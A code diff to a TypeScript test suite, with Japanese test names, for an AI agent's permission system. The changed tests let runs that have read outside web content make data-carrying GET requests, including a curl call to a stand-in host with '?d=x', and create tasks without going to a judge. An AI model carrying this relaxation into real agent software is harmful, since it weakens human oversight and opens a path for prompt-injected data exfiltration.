@@ -44,7 +44,7 @@ const outsideRead: ToolDef<Record<string, never>> = {
 };
 const ranTasks: string[] = [];
 const fakeTaskCreate: ToolDef<{ title: string }> = {
-  name: 'fake_task_create', description: 'makes a task (test)', input: Type.Object({ title: Type.String() }), effect: 'meta', escalateOnTaint: true, allowedIn: ['chat', 'task', 'agent'],
+  name: 'fake_task_create', description: 'makes a task (test)', input: Type.Object({ title: Type.String() }), effect: 'meta', allowedIn: ['chat', 'task', 'agent'],
   execute: async input => { ranTasks.push(input.title); return { content: 'made' }; },
 };
 
@@ -228,20 +228,17 @@ test('4-3a: 守る場所への書き込み（.git の中・製品の直下の AG
   assert.equal(readFileSync(join(r.root, 'AGENTS.md'), 'utf8'), 'orig');
 });
 
-test('4-3a: AP-1c（Q2）で反転: 外を読んだタスク（と親がタスクの子の担当）の escalateOnTaint の道具も、外を読んだ会話と同じく判定役へ。外を読んでいないタスクは動く', async t => {
+test('4-3a（P3 で反転）: 外を読んだタスク・親がタスクの子の担当・会話のメタの道具（タスクを作る）は、外を読んでいない実行と同じく確かめなしに動く', async t => {
   const r = rig(t, { project: false });
   ranTasks.length = 0;
   const tainted = { tainted: true, sources: ['web_fetch'] };
   const task = { kind: 'task' as const, permissionMode: 'auto' as const, task: { id: 't1', control: { outcome: 'none' as const } } };
-  assert.equal((await r.call('fake_task_create', { title: 'from task' }, { ...task, taint: tainted })).decidedBy, 'auto-mode');
-  assert.equal((await r.call('fake_task_create', { title: 'from child' }, { kind: 'agent', taint: tainted, parent: { runId: 'rp', conversationId: 'cp', kind: 'task', title: 'c', taskId: 't1' } })).decidedBy, 'auto-mode');
+  assert.equal((await r.call('fake_task_create', { title: 'from task' }, { ...task, taint: tainted })).decidedBy, 'builtin');
+  assert.equal((await r.call('fake_task_create', { title: 'from child' }, { kind: 'agent', taint: tainted, parent: { runId: 'rp', conversationId: 'cp', kind: 'task', title: 'c', taskId: 't1' } })).decidedBy, 'builtin');
+  assert.equal((await r.call('fake_task_create', { title: 'from chat' }, { kind: 'chat', taint: tainted })).decidedBy, 'builtin');
+  assert.equal((await r.call('fake_task_create', { title: 'clean task' }, task)).decidedBy, 'builtin');
   assert.deepEqual(r.waiting(), []);
-  assert.equal(r.judge.calls.length, 2);
-  const chat = await r.call('fake_task_create', { title: 'from chat' }, { kind: 'chat', taint: tainted });
-  assert.equal(chat.decidedBy, 'auto-mode', chat.output.content);
-  assert.equal(r.judge.calls.length, 3, '外を読んだ会話は判定役へ');
-  const clean = await r.call('fake_task_create', { title: 'clean task' }, task);
-  assert.equal(clean.decision, 'allow');
+  assert.equal(r.judge.calls.length, 0);
   assert.deepEqual(ranTasks, ['from task', 'from child', 'from chat', 'clean task']);
 });
 
@@ -1365,24 +1362,19 @@ const judgeRows = (r: ReturnType<typeof rig>) => (r.db.prepare('SELECT run_kind,
 const taskRun = { kind: 'task' as const, permissionMode: 'auto' as const, task: { id: 't1', control: { outcome: 'none' as const } } };
 const childRun = { kind: 'agent' as const, parent: { runId: 'rp', conversationId: 'cp', kind: 'chat' as const, title: 'c' } };
 
-test('5-J2: 外を読んだ実行のシェルの取得（データを URL に載せた GET）は判定役に回り、判定役が ask なら judge の Pending に積まれて動かない（会話・タスク・子の担当）', async t => {
+test('P3（5-J2 を反転）: 外を読んだ実行のシェルの取得（データを URL に載せた短い GET）も、読んでいない実行と同じく確かめなしに動く（会話・タスク・子の担当）', async t => {
   const r = rig(t);
   r.judge.answer = ASKS;
   for (const c of [{ kind: 'chat' as const }, taskRun, childRun]) {
     const outcome = await r.shell(DATA_GET, { ...c, taint: readWeb() });
-    assert.deepEqual([outcome.decision, outcome.decidedBy], ['ask', 'pending'], `${c.kind}: ${outcome.output.content}`);
+    assert.deepEqual([outcome.decision, outcome.decidedBy], ['allow', 'builtin'], `${c.kind}: ${outcome.output.content}`);
   }
-  const rows = r.waiting().reverse();
-  assert.deepEqual(rows.map(row => row.kind), ['judge', 'judge', 'judge']);
-  for (const row of rows) {
-    assert.equal(row.tainted, true);
-    assert.ok(row.checks.some(check => /fetches something from outside/u.test(check)), row.checks.join(' | '));
-  }
-  assert.equal(r.judge.calls.length, 3);
-  assert.deepEqual(judgeRows(r).map(row => [row.runKind, row.tool, row.askKinds.includes('egress'), row.outcome]), [['chat', 'shell_run', true, 'ask'], ['task', 'shell_run', true, 'ask'], ['agent', 'shell_run', true, 'ask']]);
+  assert.equal(r.waiting().length, 0);
+  assert.equal(r.judge.calls.length, 0);
+  assert.deepEqual(judgeRows(r), []);
 });
 
-test('5-J2: 外を読んでいない実行の同じ GET は今までどおり確かめなしに動き、判定役の記録は 0 件。動かした取得で印が付いたあとの取得は判定役へ', async t => {
+test('5-J2: 外を読んでいない実行の同じ GET は今までどおり確かめなしに動き、判定役の記録は 0 件。動かした取得で印が付いたあとの取得も同じ（P3）', async t => {
   const r = rig(t);
   r.judge.answer = ASKS;
   for (const c of [{ kind: 'chat' as const }, taskRun]) {
@@ -1397,23 +1389,25 @@ test('5-J2: 外を読んでいない実行の同じ GET は今までどおり確
   const taint = clean();
   await r.shell(DATA_GET, { taint });
   const after = await r.shell(DATA_GET, { taint });
-  assert.deepEqual([after.decision, after.decidedBy], ['ask', 'pending'], after.output.content);
-  assert.equal(r.judge.calls.length, 1);
-  assert.equal(judgeRows(r).length, 1);
+  assert.equal(taint.tainted, true);
+  assert.deepEqual([after.decision, after.decidedBy], ['allow', 'builtin'], after.output.content);
+  assert.equal(r.judge.calls.length, 0);
+  assert.equal(judgeRows(r).length, 0);
 });
 
-test('5-J2: 外を読んだあとの git fetch と npm install も判定役が見る（理由の種類に egress が載る）', { skip: !gitAvailable && 'git が無い' }, async t => {
+test('P3（5-J2 を反転）: git fetch と npm install の行き先は、外を読んだ実行でも読んでいない実行でも同じ', { skip: !gitAvailable && 'git が無い' }, async t => {
   const r = rig(t);
   initRepo(r.root);
   writeFileSync(join(r.root, 'package.json'), JSON.stringify({ name: 'p', private: true }));
   r.judge.answer = ASKS;
   for (const command of ['git fetch', 'npm install left-pad']) {
-    const outcome = await r.shell(command, { taint: readWeb() });
-    assert.deepEqual([outcome.decision, outcome.decidedBy], ['ask', 'pending'], `${command}: ${outcome.output.content}`);
+    const seen = [];
+    for (const taint of [clean(), readWeb()]) {
+      const outcome = await r.shell(command, { taint });
+      seen.push([outcome.decision, outcome.decidedBy, r.judge.calls.length]);
+    }
+    assert.deepEqual([seen[1]![0], seen[1]![1]], [seen[0]![0], seen[0]![1]], `${command}: ${JSON.stringify(seen)}`);
   }
-  assert.deepEqual(r.waiting().map(row => row.kind), ['judge', 'judge']);
-  assert.equal(r.judge.calls.length, 2);
-  assert.deepEqual(judgeRows(r).map(row => row.askKinds.includes('egress')), [true, true]);
   assert.equal(existsSync(join(r.root, 'node_modules')), false);
 });
 
@@ -1448,17 +1442,16 @@ test('5-J2: 製品の中の npm test は、外を読んだあとも判定役を�
   assert.deepEqual(judgeRows(r), []);
 });
 
-test('5-J2: 外を読んだあと、順 4 の形の命令に取得が付いていれば（npm test; curl の GET）順 4 を飛ばさず判定役が見る（egress）', { skip: !npmAvailable && 'npm が無い' }, async t => {
+test('P3（5-J2 を反転）: 順 4 の形の命令に取得が付いていても（npm test; curl の GET）、外を読んだ実行と読んでいない実行で行き先が同じ', { skip: !npmAvailable && 'npm が無い' }, async t => {
   const r = rig(t);
   writeFileSync(join(r.root, 'package.json'), JSON.stringify({ name: 'p', private: true, scripts: { test: 'node mark.js tested' } }));
   writeFileSync(join(r.root, 'mark.js'), "require('fs').writeFileSync(process.argv[2] + '.txt', '1')");
   r.judge.answer = ASKS;
-  const outcome = await r.shell(`npm test; ${CURL} -s "https://beat-test.invalid/?d=x"`, { taint: readWeb() });
-  assert.deepEqual([outcome.decision, outcome.decidedBy], ['ask', 'pending'], outcome.output.content);
-  assert.deepEqual(r.waiting().map(row => row.kind), ['judge']);
-  assert.equal(r.judge.calls.length, 1);
-  assert.deepEqual(judgeRows(r).map(row => row.askKinds.includes('egress')), [true]);
-  assert.equal(existsSync(join(r.root, 'tested.txt')), false, '動いていない');
+  const command = `npm test; ${CURL} -s "https://beat-test.invalid/?d=x"`;
+  const cleanRun = await r.shell(command, { taint: clean() });
+  const taintedRun = await r.shell(command, { taint: readWeb() });
+  assert.deepEqual([taintedRun.decision, taintedRun.decidedBy], [cleanRun.decision, cleanRun.decidedBy], taintedRun.output.content);
+  assert.equal(r.judge.calls.length, cleanRun.decidedBy === 'pending' || cleanRun.decidedBy === 'auto-mode' ? 2 : 0);
 });
 
 test('5-J2: 製品のリポジトリの git add と git commit は、外を読んだあとも判定役を呼ばずに動く（順 4・product-git）', { skip: !gitAvailable && 'git が無い' }, async t => {
@@ -1487,7 +1480,7 @@ test('5-J2: agent_run は外を読んだあとも今までどおり（判定役�
   assert.equal(r.waiting().length, 0);
 });
 
-test('5-J2: 取得を判定役に回す印は escalateOnTaint と同じ「その実行の印」。会話が前に外を読んでいても、今の実行が読んでいなければどちらも判定役を呼ばない', async t => {
+test('P3（5-J2 を反転）: 会話が前に外を読んでいても、今の実行が読んでいても、取得とメタの道具は判定役を呼ばない', async t => {
   const r = rig(t, { project: false });
   ranTasks.length = 0;
   const everTainted = { conversationTainted: () => true };
@@ -1497,9 +1490,9 @@ test('5-J2: 取得を判定役に回す印は escalateOnTaint と同じ「その
   assert.deepEqual([madeClean.decision, madeClean.decidedBy], ['allow', 'builtin'], madeClean.output.content);
   assert.equal(r.judge.calls.length, 0);
   const fetchedTainted = await r.shell(DATA_GET, { taint: readWeb() }, everTainted);
-  assert.equal(fetchedTainted.decidedBy, 'auto-mode', fetchedTainted.output.content);
+  assert.equal(fetchedTainted.decidedBy, 'builtin', fetchedTainted.output.content);
   const madeTainted = await r.call('fake_task_create', { title: 'tainted run' }, { taint: readWeb() }, everTainted);
-  assert.equal(madeTainted.decidedBy, 'auto-mode', madeTainted.output.content);
-  assert.equal(r.judge.calls.length, 2);
-  assert.deepEqual(judgeRows(r).map(row => [row.tool, row.askKinds.includes('egress'), row.askKinds.includes('taint')]), [['shell_run', true, false], ['fake_task_create', false, true]]);
+  assert.equal(madeTainted.decidedBy, 'builtin', madeTainted.output.content);
+  assert.equal(r.judge.calls.length, 0);
+  assert.deepEqual(judgeRows(r), []);
 });
